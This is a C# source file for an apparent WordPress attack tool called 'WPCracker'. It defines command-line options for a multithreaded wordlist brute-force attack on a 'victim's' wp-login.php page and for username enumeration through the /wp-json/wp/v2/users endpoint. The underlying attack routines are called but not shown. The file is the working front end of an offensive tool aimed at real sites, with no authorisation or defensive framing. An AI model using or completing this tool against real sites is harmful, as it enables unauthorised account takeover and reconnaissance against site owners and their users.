using System;
using PowerArgs;

namespace WPCracker
{
    [AllowUnexpectedArgs]
    public class MyArgs
    {
        public class AttackArgs
        {
            [HelpHook, ArgShortcut("-?"), ArgDescription("Shows this help")]
            public bool Help { get; set; }

            [ArgShortcut("--brute"), ArgDescription("Select brute force attack")]
            public bool BruteForce { get; set; }

            [ArgShortcut("--enum"), ArgDescription("Select user enumeration")]
            public bool UserEnumeration { get; set; }
        }
        
        public class BruteForce
        {
            [HelpHook, ArgShortcut("-?"), ArgDescription("Shows this help")]
            public bool Help { get; set; }

            [ArgRequired(PromptIfMissing = true), ArgShortcut("u"), ArgDescription("The victim's HTTP web address")]
            public string TargetUri { get; set; }

            [ArgRequired(PromptIfMissing = true), ArgExistingFile, ArgShortcut("p"), ArgDescription("Path to wordlist")]
            public string WordlistPath { get; set; }

            [ArgRequired(PromptIfMissing = true), ArgShortcut("n"), ArgDescription("The username of the victim")]
            public string Username { get; set; }

            [ArgDefaultValue(12), ArgShortcut("t"), ArgDescription("Maximum number of threads allowed")]
            public int MaxThreads { get; set; }

            [ArgDefaultValue(1000), ArgShortcut("c"), ArgDescription("Maximum size of test batch per thread")]
            public int BatchCount { get; set; }

            public void Main()
            {
                Attacks.BruteForceAttack(TargetUri + "/wp-login.php", Username, WordlistPath, MaxThreads, BatchCount);
                Console.ReadLine();
            }
        }
        
        public class UserEnumeration
        {
            [HelpHook, ArgShortcut("-?"), ArgDescription("Shows this help")]
            public bool Help { get; set; }

            [ArgRequired(PromptIfMissing = true), ArgShortcut("u"), ArgDescription("The victim's HTTP web address")]
            public string TargetUri { get; set; }

            public void Main()
            {
                Attacks.UserEnum(TargetUri + "/wp-json/wp/v2/users");
                Console.ReadLine();
            }
        }
    }
}